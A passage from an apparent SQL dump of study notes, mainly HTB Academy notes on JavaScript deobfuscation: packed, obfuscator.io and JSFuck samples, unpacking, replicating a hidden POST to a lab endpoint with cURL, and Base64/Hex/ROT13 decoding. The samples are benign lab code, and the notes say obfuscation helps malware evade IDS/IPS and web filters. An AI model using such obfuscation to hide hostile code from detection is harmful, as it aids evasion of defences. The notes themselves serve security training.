> **Evidence / Notes:** All four CRUD operations succeed **without any authentication token or cookie**. This is a critical broken-access-control issue: any user can read, modify, or destroy database records. PoC entry created and then deleted to prove write/delete access without harming real data.
>
> **Screenshot placeholder:** `[ Attach create + read-back + delete (empty array) sequence ]`

---

## Wrapping Up

You now have a full picture of how web requests work end to end: the HTTP and HTTPS protocols, the structure of URLs, the request/response model, the role of headers, the meaning of methods and status codes, and hands-on use of GET, POST, and full CRUD API interactions with cURL. These are the absolute fundamentals for every web assessment — almost every web attack is, at its core, a carefully crafted HTTP request and a carefully read HTTP response. Keep practicing by replaying browser requests through cURL and DevTools until building and reading raw requests feels natural, and always document each request/response pair with reproduction steps and evidence as shown in the examples above.', NULL, 'PUBLISHED', 'PUBLIC', 41, 'cmvfonfhr00ayida0a37aijsy', 'cmvcr40dj0000idhkp489xa3k', to_timestamp(1792441117.157), to_timestamp(1792441117.157), NULL, NULL)
ON CONFLICT ("slug") DO UPDATE SET "title" = EXCLUDED."title", "contentMarkdown" = EXCLUDED."contentMarkdown", "contentHtml" = EXCLUDED."contentHtml", "description" = EXCLUDED."description", "status" = EXCLUDED."status", "updatedAt" = EXCLUDED."updatedAt";
INSERT INTO "Document" ("id", "title", "slug", "description", "contentMarkdown", "contentHtml", "status", "visibility", "readingTimeMin", "categoryId", "authorId", "createdAt", "updatedAt", "publishedAt", "deletedAt")
VALUES ('cmvgoh6ee0003idhw275wi9u5', 'JavaScript Deobfuscation', 'javascript-deobfuscation', 'HTB Academy notes covering how to locate JavaScript in a page''s source, recognise and reverse code obfuscation (minifying, packing, obfuscator.io/JSFuck), beautify and deobfuscate with UnPacker, analyse the recovered function, replicate its POST request with cURL, and decode Base64/Hex/ROT13 output.', '# JavaScript Deobfuscation — HTB Academy Notes

> Module: **JavaScript Deobfuscation** (HTB Academy — Module 41)
> Covers: locating JavaScript in a page, obfuscation techniques, beautifying + deobfuscating code, analysing the recovered function, replicating it with HTTP requests, and encoding/decoding strings (Base64 / Hex / ROT13).
> Format of these notes: every heading has a short plain-English explanation, every command is broken down step by step, and each section ends with a **CTF-style documentation example** you can paste into a report.

---

## Table of Contents

1. [Introduction](#1-introduction)
2. [Source Code](#2-source-code)
   - [2.1 HTML](#21-html)
   - [2.2 CSS](#22-css)
   - [2.3 JavaScript](#23-javascript)
3. [Code Obfuscation](#3-code-obfuscation)
   - [3.1 What Is Obfuscation](#31-what-is-obfuscation)
   - [3.2 Use Cases](#32-use-cases)
4. [Basic Obfuscation](#4-basic-obfuscation)
   - [4.1 Running JavaScript Code](#41-running-javascript-code)
   - [4.2 Minifying JavaScript Code](#42-minifying-javascript-code)
   - [4.3 Packing JavaScript Code](#43-packing-javascript-code)
5. [Advanced Obfuscation](#5-advanced-obfuscation)
   - [5.1 Obfuscator (obfuscator.io)](#51-obfuscator-obfuscatorio)
   - [5.2 More Obfuscation](#52-more-obfuscation)
6. [Deobfuscation](#6-deobfuscation)
   - [6.1 Beautify](#61-beautify)
   - [6.2 Deobfuscate](#62-deobfuscate)
   - [6.3 Reverse Engineering](#63-reverse-engineering)
7. [Code Analysis](#7-code-analysis)
   - [7.1 HTTP Requests (in the Code)](#71-http-requests-in-the-code)
   - [7.2 Code Variables](#72-code-variables)
   - [7.3 Code Functions](#73-code-functions)
8. [HTTP Requests](#8-http-requests)
   - [8.1 cURL](#81-curl)
   - [8.2 POST Request](#82-post-request)
9. [Decoding](#9-decoding)
   - [9.1 Base64](#91-base64)
   - [9.2 Hex](#92-hex)
   - [9.3 Caesar / ROT13](#93-caesar--rot13)
   - [9.4 Other Types of Encoding](#94-other-types-of-encoding)
10. [Summary](#10-summary)
11. [Appendix — Quick Command Cheat-Sheet](#appendix--quick-command-cheat-sheet)

---

## 1. Introduction

This module is about **reading code that was deliberately made hard to read**, and turning it back into something you understand. Attackers and defenders both run into obfuscated JavaScript all the time — for example malware that hides its real payload inside scrambled JavaScript. If you cannot work out what that code does, you cannot finish the red-team or blue-team task in front of you. So deobfuscation is a core skill for code analysis and light reverse engineering. The goal here is to recognise obfuscated code, clean it up, understand it, and then rebuild its behaviour yourself.

The module walks a full path end to end. First you learn the basic structure of an HTML page and how to find the JavaScript inside it. Then you learn what obfuscation is, how it is done, and where it is used. After that you learn how to beautify and deobfuscate the code, how to decode encoded strings, how to analyse the recovered function, and finally how to replicate it with simple HTTP requests.

**Topics covered in the module:**
- Locating JavaScript code
- Intro to Code Obfuscation
- How to deobfuscate JavaScript code
- How to decode encoded messages
- Basic code analysis
- Sending basic HTTP requests

> ### 📄 Documentation Example (CTF-style)
> **Finding:** Client-side JavaScript hides an unreleased server endpoint.
>
> **Summary for report:** The target page shipped obfuscated JavaScript to the browser. After deobfuscation it revealed a hidden `POST` request to a server endpoint that is not linked anywhere in the UI, which became the entry point for further testing.
>
> **Why it matters:** Anything sent to the browser is readable by the client. Obfuscation slows an attacker down but never hides logic completely.
>
> **Screenshot:** `[ attach view-source of the page + the referenced .js file ]`

---

## 2. Source Code

Almost every modern website runs on three languages working together, and JavaScript is where the real behaviour lives. **HTML** defines the page''s fields and structure, **CSS** defines how it looks, and **JavaScript** performs the actual functions that make the site work. Most of this happens quietly in the background while we only see and click the finished front-end. Because the browser renders everything for us, we rarely look at the raw source. But when we want to understand what a page is really doing on the client side, reading its source code is the first move.

In the module exercise you spawn the target, open Firefox in the PwnBox, and visit the URL from the question:

```
http://SERVER_IP:PORT
```

The page just says **"Secret Serial Generator"** with no visible inputs or buttons. With nothing obvious to interact with, the next step is to look under the hood at the source. To open the raw source view of the page, press:

```
[CTRL + U]
```

That opens a special `view-source:` view of the current page:

```
view-source:http://SERVER_IP:PORT
```

From here you can read the full HTML the server sent.

### 2.1 HTML

HTML is the skeleton of the page and it often carries more than just visible content. The source can hold **comments** that developers left to explain the code, and sometimes those comments accidentally leak sensitive information (paths, credentials, hidden endpoints, "TODO" notes). Because comments are invisible in the rendered page but fully visible in the source, they are always worth reading line by line. Treat every HTML comment as a potential clue. In a real test, skimming the HTML source is one of the cheapest, fastest recon steps you can do.

**Step-by-step — view a page''s HTML source:**
1. Load the page in your browser.
2. Press `[CTRL + U]` (or right-click → *View Page Source*).
3. Read top to bottom, paying attention to `<!-- comments -->`, `<script>` tags, and linked files.

### 2.2 CSS

CSS controls the page''s design, and it can live in one of two places. It is either **internal** — written directly inside the HTML between `<style>` elements — or **external** — kept in a separate `.css` file that the HTML links to. Knowing which style a page uses tells you where to look for layout logic, and occasionally CSS files reveal hidden or admin-only elements. In this exercise the CSS is defined internally, inside the page itself.

**Internal CSS** looks like this (inside the HTML):

```html
<style>
    *,
    html {
        margin: 0;
        padding: 0;
        border: 0;
    }
    ...SNIP...
    h1 {
        font-size: 144px;
    }
    p {
        font-size: 64px;
    }
</style>
```

**External CSS** is instead pulled in from a separate file, referenced in the `<head>` with a `<link>` tag:

```html
<head>
    <link rel="stylesheet" href="style.css">
</head>
```

- `rel="stylesheet"` tells the browser this linked file is a stylesheet.
- `href="style.css"` is the path to the external CSS file (which you can open directly in the browser).

### 2.3 JavaScript

JavaScript follows the exact same internal/external pattern as CSS. It can be written **inline** between `<script>` elements, or kept in a separate **`.js` file** that the HTML references. Finding where the JavaScript lives is the whole point of this section, because that file is where the page''s real logic sits. In the Secret Serial Generator, the script is referenced externally.

The HTML source references the script like this:

```html
<script src="secret.js"></script>
```

- `src="secret.js"` is the path to the external JavaScript file.
- Clicking that filename (or visiting `http://SERVER_IP:PORT/secret.js`) opens the script directly.

When you open `secret.js`, the code is unreadable — a tangled one-liner that makes no sense at first glance:

```javascript
eval(function (p, a, c, k, e, d) { e = function (c) { ''...SNIP... |true|function''.split(''|''), 0, {}))
```

The reason it looks like this is **code obfuscation**. The next sections explain what that is, how it is done, and how to reverse it.

> ### 📄 Documentation Example (CTF-style)
> **Finding:** Obfuscated external JavaScript referenced from page source.
>
> **Reproduction:**
> ```bash
> curl -s http://SERVER_IP:PORT/            # read the HTML, note <script src="secret.js">
> curl -s http://SERVER_IP:PORT/secret.js   # pull the obfuscated script
> ```
>
> **Evidence / Notes:** `secret.js` is loaded by the page and contains a single obfuscated `eval(function(p,a,c,k,e,d){...})` block, a strong indicator of packed JavaScript worth deobfuscating.
>
> **Screenshot:** `[ attach view-source + secret.js contents ]`

---

## 3. Code Obfuscation

Before you can deobfuscate anything, you have to understand how obfuscation works in the first place. If you do not know how code was scrambled, you will struggle to unscramble it — especially when a custom obfuscator was used. This section explains the idea, and later sections turn it into hands-on practice. Think of this as learning the lock before learning to pick it. The better you understand the technique, the faster you recognise it in the wild.

### 3.1 What Is Obfuscation

Obfuscation is a technique that makes a script **hard for humans to read while keeping it fully working** from the computer''s point of view. The behaviour stays the same; only readability changes (and performance may drop a little). It is almost always done automatically by an obfuscation tool: you feed in normal code, and the tool rewrites it into a much harder-to-read form, depending on how that tool is designed. A very common trick is to turn the code into a **dictionary** of all its words and symbols, then rebuild the original during execution by looking each piece up. You can try this yourself on a simple script at the example obfuscator.

A key reason obfuscation is so common with JavaScript is **where JavaScript runs**. Interpreted languages like Python, PHP and JavaScript are published and run without being compiled. Python and PHP usually sit on the server, hidden from the user — but JavaScript runs in the browser on the **client side**, so its code is delivered to the user in cleartext. Since anyone can read it, developers obfuscate it to make that harder.

- Example obfuscator used in the module: `http://beautifytools.com/javascript-obfuscator.php`

### 3.2 Use Cases

There are several legitimate and not-so-legitimate reasons people obfuscate code. One common reason is to **protect intellectual property** — hiding the original logic so others cannot easily copy, reuse, or reverse engineer it. Another is to add a **security layer** around sensitive actions like authentication or encryption, to make attacking that logic harder. But the single most common reason, in practice, is **malicious**: attackers obfuscate malware so that Intrusion Detection and Prevention Systems (IDS/IPS) have a harder time spotting their scripts.

One important warning from the module: doing authentication or encryption **on the client side is not recommended**, because client-side code is far more exposed to attack. If the logic is in the browser, the user controls it.

> ### 📄 Documentation Example (CTF-style)
> **Finding:** Sensitive logic obfuscated and shipped client-side.
>
> **Evidence / Notes:** The application obfuscates JavaScript that is delivered to the browser. Because obfuscation only reduces readability and does not encrypt behaviour, the logic can be recovered. If any auth/crypto decision happens here, it is attackable.
>
> **Recommendation:** Never rely on client-side obfuscation as a security control; enforce sensitive logic server-side.
>
> **Screenshot:** `[ attach obfuscated snippet + note of what it protected ]`

---

## 4. Basic Obfuscation

Obfuscation is normally automated — there are many tools for many languages, and serious developers or attackers often build their own to make reversing harder. In this section you take one simple line of JavaScript and watch it move through three stages: running in cleartext, minified, and finally packed. Seeing the same line at each stage makes the transformation obvious. The point is to feel how readability drops while behaviour stays identical.

### 4.1 Running JavaScript Code

First you confirm what the original code does, in plain readable form. The example line simply prints a message to the console:

```javascript
console.log(''HTB JavaScript Deobfuscation Module'');
```

- `console.log(...)` prints whatever is inside the brackets to the browser/JS console.

**Step-by-step — run it:**
1. Open **JSConsole**: `https://jsconsole.com`
2. Paste the line and press **Enter**.
3. You see the output: `HTB JavaScript Deobfuscation Module`.

This is your baseline — remember this output, because every obfuscated version must still produce it.

### 4.2 Minifying JavaScript Code

**Minification** squeezes the whole script onto a single (often very long) line, removing spaces and line breaks while keeping it 100% functional. It lowers readability as a side effect, and it is most useful on **longer** code — a single short line barely changes when minified. Minified JavaScript is usually saved with a `.min.js` extension. Note that minification is not JavaScript-only; many languages can be minified the same way.

**Step-by-step — minify and test:**
1. Open **javascript-minifier**: `https://javascript-minifier.com`
2. Paste your code and click **Minify**.
3. Copy the minified output from the right-hand panel.
4. Paste it back into `https://jsconsole.com` and run it — it works exactly the same.

### 4.3 Packing JavaScript Code

**Packing** is a stronger step that makes the code genuinely obscure. Using BeautifyTools, the one-line `console.log` becomes this:

```javascript
eval(function(p,a,c,k,e,d){e=function(c){return c};if(!''''.replace(/^/,String)){while(c--){d[c]=k[c]||c}k=[function(e){return d[e]}];e=function(){return''\\w+''};c=1};while(c--){if(k[c]){p=p.replace(new RegExp(''\\b''+e(c)+''\\b'',''g''),k[c])}}return p}(''5.4(\''3 2 1 0\'');'',6,6,''Module|Deobfuscation|JavaScript|HTB|log|console''.split(''|''),0,{}))
```

Paste that into `https://jsconsole.com` and it still prints the same message. So the behaviour is unchanged — only readability collapsed.

- Obfuscator used: `http://beautifytools.com/javascript-obfuscator.php`

**How to recognise packing:** this style is known as **"packing"**, and its tell-tale sign is the **six function arguments** in the opening function: `function(p,a,c,k,e,d)`. A packer converts all the words and symbols of the code into a **list/dictionary**, then uses the `(p,a,c,k,e,d)` routine to rebuild the original during execution. The exact `(p,a,c,k,e,d)` logic can differ between packers, but it always encodes an order so the pieces can be reassembled.

**Weakness of packing:** even after packing, the **main strings are still visible in cleartext** (look at `Module|Deobfuscation|JavaScript|HTB|log|console` above). That can leak the code''s purpose — which is why people reach for stronger obfuscation next.

> ### 📄 Documentation Example (CTF-style)
> **Finding:** Packed JavaScript still leaks strings in cleartext.
>
> **Reproduction:** Paste the `eval(function(p,a,c,k,e,d){...})` block into an unpacker or read the pipe-delimited dictionary at the end of the call.
>
> **Evidence / Notes:** The packer''s string table (`''...|log|console''.split(''|'')`) exposes the original identifiers, revealing intended functionality without full deobfuscation.
>
> **Screenshot:** `[ attach packed code with the string table highlighted ]`

---

## 5. Advanced Obfuscation

Packing hid the structure but still leaked strings. Advanced obfuscation goes further and tries to erase every readable remnant of the original. In this section you use a stronger tool and then look at even more extreme styles. The lesson is that obfuscation is a spectrum — from "lightly scrambled" to "almost alien" — and heavier obfuscation costs performance. Recognising the heavier styles saves you a lot of guesswork later.

### 5.1 Obfuscator (obfuscator.io)

The tool `https://obfuscator.io` produces much stronger output, especially once you change **String Array Encoding** to **Base64** before clicking **Obfuscate**. The same simple `console.log` line becomes this:

```javascript
var _0x1ec6=[''Bg9N'',''sfrciePHDMfty3jPChqGrgvVyMz1C2nHDgLVBIbnB2r1Bgu=''];(function(_0x13249d,_0x1ec6e5){var _0x14f83b=function(_0x3f720f){while(--_0x3f720f){_0x13249d[''push''](_0x13249d[''shift'']());}};_0x14f83b(++_0x1ec6e5);}(_0x1ec6,0xb4));var _0x14f8=function(_0x13249d,_0x1ec6e5){_0x13249d=_0x13249d-0x0;var _0x14f83b=_0x1ec6[_0x13249d];if(_0x14f8[''eOTqeL'']===undefined){var _0x3f720f=function(_0x32fbfd){var _0x523045=''abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/='',_0x4f8a49=String(_0x32fbfd)[''replace''](/=+$/,'''');var _0x1171d4='''';for(var _0x44920a=0x0,_0x2a30c5,_0x443b2f,_0xcdf142=0x0;_0x443b2f=_0x4f8a49[''charAt''](_0xcdf142++);~_0x443b2f&&(_0x2a30c5=_0x44920a%0x4?_0x2a30c5*0x40+_0x443b2f:_0x443b2f,_0x44920a++%0x4)?_0x1171d4+=String[''fromCharCode''](0xff&_0x2a30c5>>(-0x2*_0x44920a&0x6)):0x0){_0x443b2f=_0x523045[''indexOf''](_0x443b2f);}return _0x1171d4;};_0x14f8[''oZlYBE'']=function(_0x8f2071){var _0x49af5e=_0x3f720f(_0x8f2071);var _0x52e65f=[];for(var _0x1ed1cf=0x0,_0x79942e=_0x49af5e[''length''];_0x1ed1cf<_0x79942e;_0x1ed1cf++){_0x52e65f+=''%''+(''00''+_0x49af5e[''charCodeAt''](_0x1ed1cf)[''toString''](0x10))[''slice''](-0x2);}return decodeURIComponent(_0x52e65f);},_0x14f8[''qHtbNC'']={},_0x14f8[''eOTqeL'']=!![];}var _0x20247c=_0x14f8[''qHtbNC''][_0x13249d];return _0x20247c===undefined?(_0x14f83b=_0x14f8[''oZlYBE''](_0x14f83b),_0x14f8[''qHtbNC''][_0x13249d]=_0x14f83b):_0x14f83b=_0x20247c,_0x14f83b;};console[_0x14f8(''0x0'')](_0x14f8(''0x1''));
```

Now there are **no readable remnants** of the original code. Paste it into `https://jsconsole.com` and it still prints the same message. Tip from the module: play with the settings on `https://obfuscator.io` to make it even harder, then re-run each version in JSConsole to confirm it still works.

### 5.2 More Obfuscation

Obfuscation styles vary wildly, and some look like pure symbol soup. Take this example, which uses only brackets and symbols yet still runs:

```javascript
[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]
...SNIP... (full code is very long but runs successfully)
```

Run it and it still prints `HTB JavaScript Deobfuscation Module`. The code was snipped because the full version is enormous — but the complete blob executes fine.

**Key takeaways from this section:**
- You can obfuscate using **JSFuck**-style symbol-only code and re-run it the same way.
- These heavy styles **slow execution down noticeably**, proving obfuscation can hurt performance.
- Other extreme obfuscators exist, such as **JJ Encode** and **AA Encode**, but they make execution/compilation very slow. They are not recommended unless you have a clear reason — for example **bypassing web filters or restrictions**.

> ### 📄 Documentation Example (CTF-style)
> **Finding:** Heavy obfuscation (Base64 string arrays / symbol-only encoding) used to hide logic.
>
> **Evidence / Notes:** Script executes identically after obfuscation but exposes no readable identifiers. Style identified as `obfuscator.io` (Base64 string array) / JSFuck-type encoding. Automated unpackers are needed; manual reversing may be required for custom variants.
>
> **Impact note:** Such encoding is also used to evade IDS/IPS and web filters — flag it as an evasion indicator, not just a readability choice.
>
> **Screenshot:** `[ attach obfuscated blob + JSConsole output proving same behaviour ]`

---

## 6. Deobfuscation

Now you reverse the process. Just as there are tools to scramble code automatically, there are tools to **beautify** and **deobfuscate** it automatically. This section takes the packed `secret.js` and turns it back into readable JavaScript in two stages: first format it, then unpack it. When automated tools run out of road, you fall back to manual reverse engineering. This is the core skill the whole module builds toward.

### 6.1 Beautify

Right now the script is one long line — that is **minified** code. **Beautifying** reformats it into proper, indented JavaScript so it is readable again. The simplest way is your browser''s own Dev Tools. In Firefox, open the debugger with `CTRL+SHIFT+Z`, click the `secret.js` script, then click the `{ }` ("Pretty Print") button at the bottom to reformat it. You can also use online tools or editor plugins such as **Prettier** or **Beautifier**.

The `secret.js` script to work with:

```javascript
eval(function (p, a, c, k, e, d) { e = function (c) { return c.toString(36) }; if (!''''.replace(/^/, String)) { while (c--) { d[c.toString(a)] = k[c] || c.toString(a) } k = [function (e) { return d[e] }]; e = function () { return ''\\w+'' }; c = 1 }; while (c--) { if (k[c]) { p = p.replace(new RegExp(''\\b'' + e(c) + ''\\b'', ''g''), k[c]) } } return p }(''g 4(){0 5="6{7!}";0 1=8 a();0 2="/9.c";1.d("e",2,f);1.b(3)}'', 17, 17, ''var|xhr|url|null|generateSerial|flag|HTB|flag|new|serial|XMLHttpRequest|send|php|open|POST|true|function''.split(''|''), 0, {}))
```

**Step-by-step — beautify in Firefox:**
1. Open the page, then open the debugger with `CTRL+SHIFT+Z`.
2. In the sources list, click `secret.js`.
3. Click the `{ }` Pretty Print button at the bottom of the panel.
4. Read the reformatted code.

Online beautifiers that do the same job:
- `https://prettier.io/playground/`
- `https://beautifier.io/`

**Important:** beautifying only fixes *formatting*. This script was **both minified and obfuscated (packed)**, so pretty-printing alone still leaves it hard to read. You need a deobfuscator next.

### 6.2 Deobfuscate

To actually unpack the logic, use a deobfuscator. The module uses **UnPacker**: paste the obfuscated code and click **UnPack**.

- Tool: `https://matthewfl.com/unPacker.html`
- **Tip:** do not leave any empty lines before the script — blank leading lines can throw off the deobfuscation and give wrong results.

UnPacker returns readable code:

```javascript
function generateSerial() {
  ...SNIP...
  var xhr = new XMLHttpRequest;
  var url = "/serial.php";
  xhr.open("POST", url, true);
  xhr.send(null);
};
```

Because this was **packing**, there is a second manual trick: find the **return value at the end** of the packer and use `console.log` to **print** it instead of letting `eval` **execute** it. That prints the rebuilt source instead of running it.

### 6.3 Reverse Engineering

Automated tools work well up to a point, but the more heavily encoded or custom the obfuscation, the more they struggle. When a **custom obfuscator** is used, automated cleaners often fail. In those cases you must **manually reverse engineer** the code — work out by hand how it was obfuscated and what it does. For deeper coverage of advanced JavaScript deobfuscation and reverse engineering, the module points to the **Secure Coding 101** module.

> ### 📄 Documentation Example (CTF-style)
> **Finding:** Packed `secret.js` deobfuscated to reveal hidden `POST /serial.php`.
>
> **Reproduction:**
> 1. Pull `secret.js`; confirm it is a packer (`function(p,a,c,k,e,d)`).
> 2. Paste into `https://matthewfl.com/unPacker.html` → **UnPack** (no leading blank lines).
> 3. Read the recovered `generateSerial()` function.
>
> **Evidence / Notes:** Recovered code sends an empty `POST` to `/serial.php` via `XMLHttpRequest`. Endpoint is not referenced anywhere in the visible UI.
>
> **Screenshot:** `[ attach UnPacker output showing generateSerial() ]`

---

## 7. Code Analysis

Deobfuscation gave you readable code — now you have to understand it. This section reads the recovered function line by line to work out exactly what it does. The whole file contains a single function, `generateSerial`, so the job is small and focused. Understanding it is what lets you **replicate** it in the next section. Reading unfamiliar functions and Googling what each call does is a normal, expected part of this work.

The deobfuscated script:

```javascript
''use strict'';
function generateSerial() {
  ...SNIP...
  var xhr = new XMLHttpRequest;
  var url = "/serial.php";
  xhr.open("POST", url, true);
  xhr.send(null);
};
```

### 7.1 HTTP Requests (in the Code)

The file holds exactly one function — `generateSerial` — and its whole job is to make a web request. You go through it line by line to see how that request is built and sent. There is nothing hidden beyond this one function; the obfuscation was the only thing making it look complex. Once read, its purpose is simple and clear.

### 7.2 Code Variables

The function defines two variables. The first is `xhr`, which creates a new `XMLHttpRequest` object. If you do not know what that is, the normal move is to **Google `XMLHttpRequest`** — you will find it is the JavaScript feature that handles web requests. The second variable is `url`, set to `"/serial.php"`. Because no domain is given, that path is on the **same domain** as the page.

```javascript
var xhr = new XMLHttpRequest;   // object that sends web requests
var url = "/serial.php";        // same-domain endpoint
```

### 7.3 Code Functions

Next the code calls `xhr.open` with `"POST"` and `url`, then `xhr.send`. Googling `xhr.open` shows it opens an HTTP request of the chosen method (`GET` or `POST`) to the URL, and `xhr.send` then sends it. So the entire function does one thing: send a **`POST` request to `/serial.php`**, with **no POST data** and **nothing read back**.

```javascript
xhr.open("POST", url, true);   // prepare a POST request to /serial.php (async = true)
xhr.send(null);                // send it with no body
```

The developers probably meant to trigger this when generating a serial (e.g. a "Generate Serial" button), but since no such element exists in the page, the function looks **unused and kept for future use**. That is exactly the interesting part: deobfuscation + analysis uncovered a function the app does not openly call. You can now **replicate** it to see whether the server actually handles that `POST`. Unreleased functionality like this often hides bugs and vulnerabilities.

> ### 📄 Documentation Example (CTF-style)
> **Finding:** Hidden/unused client function targets a live server endpoint.
>
> **Evidence / Notes:** `generateSerial()` issues an empty `POST` to `/serial.php` but is never wired to any UI control. Unreleased endpoints are prime candidates for logic flaws — test directly.
>
> **Next step:** Replicate the request with cURL (Section 8) to see if the server responds.
>
> **Screenshot:** `[ attach annotated generateSerial() breakdown ]`

---

## 8. HTTP Requests

The previous section showed that `secret.js` just sends an empty `POST` to `/serial.php`. Now you replicate that yourself with **cURL** instead of the browser. Doing it by hand lets you see the raw server response that the JavaScript threw away. This is how you confirm whether a hidden endpoint actually does something. (For a deeper dive, the module references the **Web Requests** module.)

### 8.1 cURL

**cURL** is a command-line tool for making web requests, available on Linux, macOS, and modern Windows PowerShell. Give it a URL and it fetches the page as text. Running it against the target returns the same HTML you saw earlier in the source view.

```shellsession
curl http://SERVER_IP:PORT/
```

**Step-by-step — what this does:**
1. `curl` — the tool that makes the request.
2. `http://SERVER_IP:PORT/` — the target URL to fetch.
3. Output: the raw HTML of the page (the Secret Serial Generator markup), printed to your terminal.

Example of what comes back (same HTML as the source view):

```html
<!DOCTYPE html>
<head>
    <title>Secret Serial Generator</title>
    ...SNIP...
    <h1>Secret Serial Generator</h1>
    <p>This page generates secret serials!</p>
</body>
</html>
```

### 8.2 POST Request

To replicate `generateSerial`, you must send a **`POST`** request, not a default `GET`. You do that with the `-X POST` flag:

```shellsession
curl -s http://SERVER_IP:PORT/ -X POST
```

**Step-by-step — flags explained:**
1. `-s` — **silent** mode; hides the progress meter / extra clutter so you only see the real response.
2. `-X POST` — sets the HTTP method to `POST` (instead of the default `GET`).

A `POST` request usually carries **data**. To include POST data, use the `-d` flag with `param=value` pairs:

```shellsession
curl -s http://SERVER_IP:PORT/ -X POST -d "param1=sample"
```

- `-d "param1=sample"` — sends the body data `param1=sample`. Using `-d` also implies a `POST`, and you can repeat it or combine params with `&`.

With this you can now hit `/serial.php` the same way the hidden function would, and read whatever the server sends back (which, in the next section, turns out to be encoded).

> ### 📄 Documentation Example (CTF-style)
> **Finding:** Hidden endpoint `/serial.php` responds to replicated `POST`.
>
> **Reproduction:**
> ```bash
> curl -s http://SERVER_IP:PORT/serial.php -X POST -d "param1=sample"
> ```
>
> **Evidence / Notes:** Manually replicating the deobfuscated `generateSerial()` call returns a Base64-looking string from the server, confirming the endpoint is live and handled server-side.
>
> **Screenshot:** `[ attach terminal showing the POST + encoded response ]`

---

## 9. Decoding

When you replicate the hidden `POST` to `/serial.php`, the server does not return plain text — it returns an encoded block:

```shellsession
curl http://SERVER_IP:PORT/serial.php -X POST -d "param1=sample"

ZG8gdGhlIGV4ZXJjaXNlLCBkb24ndCBjb3B5IGFuZCBwYXN0ZSA7KQo=
```

Encoded output like this is the other half of obfuscation: scripts often carry **encoded text blocks** that get decoded only at runtime, both to confuse humans and to dodge detection systems. To read these, you need to recognise the encoding and reverse it. This section covers the three most common encodings you will meet: **Base64**, **Hex**, and **ROT13**.

### 9.1 Base64

Base64 encoding exists mainly to **avoid special characters**. Whatever you feed it — even raw binary — comes out as only alpha-numeric characters plus `+` and `/`. That makes the output safe to transport anywhere, and it is extremely common in obfuscated scripts and web traffic. It is also one of the easiest encodings to spot.

**Spotting Base64:** the string contains only letters, numbers, `+`, and `/`, and its most distinctive feature is **`=` padding** at the end. Base64 length is always a multiple of 4, so when the data is short, one or two `=` characters are added to pad it out.

**Base64 Encode** — pipe text into `base64`:

```shellsession
echo https://www.hackthebox.eu/ | base64

aHR0cHM6Ly93d3cuaGFja3RoZWJveC5ldS8K
```

- `echo https://www.hackthebox.eu/` — prints the text to send.
- `| base64` — pipes that text into the `base64` tool, which **encodes** it.

**Base64 Decode** — add the `-d` flag:

```shellsession
echo aHR0cHM6Ly93d3cuaGFja3RoZWJveC5ldS8K | base64 -d

https://www.hackthebox.eu/
```

- `-d` — **decode** mode, turning Base64 back into the original text.

> So decoding the `/serial.php` response (`ZG8gdGhlI...`) with `base64 -d` reveals the hidden message from the server.

### 9.2 Hex

Hex encoding converts each character into its **hexadecimal position in the ASCII table**. For example `a` is `61`, `b` is `62`, `c` is `63`, and so on. You can view the full ASCII table on Linux with `man ascii`. Hex is another very common, easy-to-spot encoding.

**Spotting Hex:** the string contains **only hex characters** — `0-9` and `a-f` (16 symbols total). That limited character set makes hex as easy to recognise as Base64.

**Hex Encode** — use `xxd -p`:

```shellsession
echo https://www.hackthebox.eu/ | xxd -p

68747470733a2f2f7777772e6861636b746865626f782e65752f0a
```

- `xxd -p` — produces a **plain** hex dump (`-p` = postscript/plain, continuous hex with no offsets or ASCII column).

**Hex Decode** — add `-r` (reverse):

```shellsession
echo 68747470733a2f2f7777772e6861636b746865626f782e65752f0a | xxd -p -r

https://www.hackthebox.eu/
```

- `-r` — **reverse**, converting hex back into the original characters.
- `-p` — keeps it in the same plain format used to encode.

### 9.3 Caesar / ROT13

A Caesar cipher shifts every letter by a fixed number of places — shift by 1 and `a→b`, `b→c`, and so on. **ROT13** is the most common variant, shifting each letter **13 places forward**. It is old and weak, but it still shows up in obfuscation because it instantly makes text look random.

**Spotting Caesar/ROT13:** because each letter always maps to the same other letter, patterns survive. For example, in ROT13 `http://www` becomes `uggc://jjj` — the repeated structure (the `://` and the three identical letters) still shows through, which helps you recognise it.

**ROT13 Encode** — there is no dedicated command, so you build one with `tr`:

```shellsession
echo https://www.hackthebox.eu/ | tr ''A-Za-z'' ''N-ZA-Mn-za-m''

uggcf://jjj.unpxgurobk.rh/
```

- `tr ''A-Za-z'' ''N-ZA-Mn-za-m''` — **tr**anslates characters: every letter in the first set is mapped to the matching letter in the second set, which is the alphabet rotated by 13 (`A→N`, `N→A`, etc.), for both upper and lower case.

**ROT13 Decode** — ROT13 is its own inverse, so run the **exact same command** again:

```shellsession
echo uggcf://jjj.unpxgurobk.rh/ | tr ''A-Za-z'' ''N-ZA-Mn-za-m''

https://www.hackthebox.eu/
```

You can also use an online tool like `rot13` to encode/decode.

### 9.4 Other Types of Encoding

Base64, Hex, and ROT13 are the common ones, but there are **hundreds** of encoding methods, and you will occasionally meet something unfamiliar. The practical approach is: first **identify** the encoding, then find an online tool to **decode** it. Tools like **Cipher Identifier** can auto-detect the method for you — try feeding the strings above into it to see it recognise them.

One important distinction: beyond encoding, many obfuscators use **encryption** — encoding a string with a **key**. That is much harder to reverse, especially when the decryption key is **not stored inside the script**. Without the key, you may not be able to recover the original at all.

> ### 📄 Documentation Example (CTF-style)
> **Finding:** Server response from hidden endpoint is Base64-encoded.
>
> **Reproduction:**
> ```bash
> curl -s http://SERVER_IP:PORT/serial.php -X POST -d "param1=sample" | base64 -d
> ```
>
> **Evidence / Notes:** Decoding the `/serial.php` response reveals the hidden plaintext message, completing the chain: obfuscated JS → deobfuscate → analyse → replicate request → decode output.
>
> **Encodings reference:** Base64 (`=` padding, A–Z a–z 0–9 + /), Hex (0–9 a–f only), ROT13 (letter-for-letter, structure survives).
>
> **Screenshot:** `[ attach decoded response ]`

---

## 10. Summary

